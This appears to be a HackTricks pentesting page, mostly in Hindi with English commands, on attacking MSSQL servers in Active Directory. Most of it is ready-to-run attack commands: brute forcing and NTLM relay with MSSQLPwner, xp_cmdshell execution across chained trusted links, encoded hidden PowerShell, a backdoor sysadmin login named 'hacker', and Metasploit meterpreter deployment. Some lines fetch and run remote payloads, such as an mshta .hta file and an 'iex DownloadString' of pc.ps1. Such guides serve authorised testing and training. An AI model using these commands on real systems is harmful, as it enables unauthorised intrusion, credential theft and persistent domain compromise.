# MSSQL AD Abuse

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## **MSSQL Enumeration / Discovery**

### Python

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) उपकरण impacket पर आधारित है, और यह kerberos टिकट का उपयोग करके प्रमाणीकरण करने और लिंक श्रृंखलाओं के माध्यम से हमले करने की अनुमति देता है।

<figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
```shell
# Interactive mode
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive

# Interactive mode with 2 depth level of impersonations

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -max-impersonation-depth 2 interactive

# Executing custom assembly on the current server with windows authentication and executing hostname command

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname

# Executing custom assembly on the current server with windows authentication and executing hostname command on the SRV01 linked server

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 custom-asm hostname

# Executing the hostname command using stored procedures on the linked SRV01 server

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname

# Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate

# Issuing NTLM relay attack on the SRV01 server

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250

# Executing direct query

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth direct-query "SELECT CURRENT_USER"

# Retrieving password from the linked server DC01

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrive-password

# Execute code using custom assembly on the linked server DC01

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 inject-custom-asm SqlInject.dll

# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using tickets against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt

# Bruteforce using passwords against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt

# Bruteforce using hashes against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt

```
### डोमेन सत्र के बिना नेटवर्क से एन्यूमरेट करना
```

# Interactive mode

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive

````
---
###  Powershell

इस मामले में powershell मॉड्यूल [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) बहुत उपयोगी है।
```powershell
Import-Module .\PowerupSQL.psd1
````
### नेटवर्क से डोमेन सत्र के बिना एन्यूमरेट करना
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### डोमेन के अंदर से एन्यूमरेट करना
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
## MSSQL बेसिक दुरुपयोग

### एक्सेस DB
```powershell
#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### MSSQL RCE

यह भी संभव हो सकता है कि **कमांड्स** को MSSQL होस्ट के अंदर **निष्पादित** किया जा सके।
```powershell
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
**निम्नलिखित अनुभाग में देखें कि इसे मैन्युअल रूप से कैसे करना है।**

### MSSQL बुनियादी हैकिंग ट्रिक्स

{{#ref}}
../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/
{{#endref}}

## MSSQL विश्वसनीय लिंक

यदि एक MSSQL उदाहरण को एक अलग MSSQL उदाहरण द्वारा विश्वसनीय (डेटाबेस लिंक) माना जाता है। यदि उपयोगकर्ता के पास विश्वसनीय डेटाबेस पर विशेषाधिकार हैं, तो वह **अन्य उदाहरण में क्वेरी निष्पादित करने के लिए विश्वास संबंध का उपयोग कर सकेगा**। ये विश्वास श्रृंखलाबद्ध किए जा सकते हैं और किसी बिंदु पर उपयोगकर्ता कुछ गलत कॉन्फ़िगर किए गए डेटाबेस को खोजने में सक्षम हो सकता है जहाँ वह कमांड निष्पादित कर सकता है।

**डेटाबेस के बीच के लिंक वन ट्रस्ट के पार भी काम करते हैं।**

### पॉवरशेल दुरुपयोग
```powershell
#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
### Metasploit

आप मेटास्प्लॉइट का उपयोग करके आसानी से विश्वसनीय लिंक की जांच कर सकते हैं।
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
ध्यान दें कि metasploit केवल MSSQL में `openquery()` फ़ंक्शन का दुरुपयोग करने की कोशिश करेगा (तो, यदि आप `openquery()` के साथ कमांड निष्पादित नहीं कर सकते हैं, तो आपको कमांड निष्पादित करने के लिए `EXECUTE` विधि **हाथ से** आज़मानी होगी, नीचे और देखें।)

### मैनुअल - Openquery()

**Linux** से आप **sqsh** और **mssqlclient.py** के साथ एक MSSQL कंसोल शेल प्राप्त कर सकते हैं।

**Windows** से आप लिंक भी ढूंढ सकते हैं और **MSSQL क्लाइंट जैसे** [**HeidiSQL**](https://www.heidisql.com) का उपयोग करके कमांड को मैन्युअल रूप से निष्पादित कर सकते हैं।

_Windows प्रमाणीकरण का उपयोग करके लॉगिन करें:_

![](<../../images/image (808).png>)

#### विश्वसनीय लिंक खोजें
```sql
select * from master..sysservers;
EXEC sp_linkedservers;
```
![](<../../images/image (716).png>)

#### विश्वसनीय लिंक में क्वेरी निष्पादित करें

लिंक के माध्यम से क्वेरी निष्पादित करें (उदाहरण: नए सुलभ उदाहरण में अधिक लिंक खोजें):
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
> [!WARNING]
> जांचें कि डबल और सिंगल कोट्स कहाँ उपयोग किए गए हैं, उन्हें इस तरह से उपयोग करना महत्वपूर्ण है।

![](<../../images/image (643).png>)

आप इन विश्वसनीय लिंक श्रृंखलाओं को मैन्युअल रूप से हमेशा के लिए जारी रख सकते हैं।
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
यदि आप `openquery()` से `exec xp_cmdshell` जैसी क्रियाएँ नहीं कर सकते हैं, तो `EXECUTE` विधि का प्रयास करें।

### मैनुअल - EXECUTE

आप `EXECUTE` का उपयोग करके विश्वसनीय लिंक का भी दुरुपयोग कर सकते हैं:
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## स्थानीय विशेषाधिकार वृद्धि

**MSSQL स्थानीय उपयोगकर्ता** के पास आमतौर पर एक विशेष प्रकार का विशेषाधिकार होता है जिसे **`SeImpersonatePrivilege`** कहा जाता है। यह खाता "प्रमाणीकरण के बाद एक क्लाइंट का अनुकरण" करने की अनुमति देता है।

एक रणनीति जो कई लेखकों ने विकसित की है, वह है एक SYSTEM सेवा को एक धोखाधड़ी या मैन-इन-द-मिडल सेवा के लिए प्रमाणीकरण करने के लिए मजबूर करना जिसे हमलावर बनाता है। यह धोखाधड़ी सेवा तब SYSTEM सेवा का अनुकरण कर सकती है जबकि यह प्रमाणीकरण करने की कोशिश कर रही है।

[SweetPotato](https://github.com/CCob/SweetPotato) के पास इन विभिन्न तकनीकों का एक संग्रह है जिसे Beacon के `execute-assembly` कमांड के माध्यम से निष्पादित किया जा सकता है।

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{{#include ../../banners/hacktricks-training.md}}
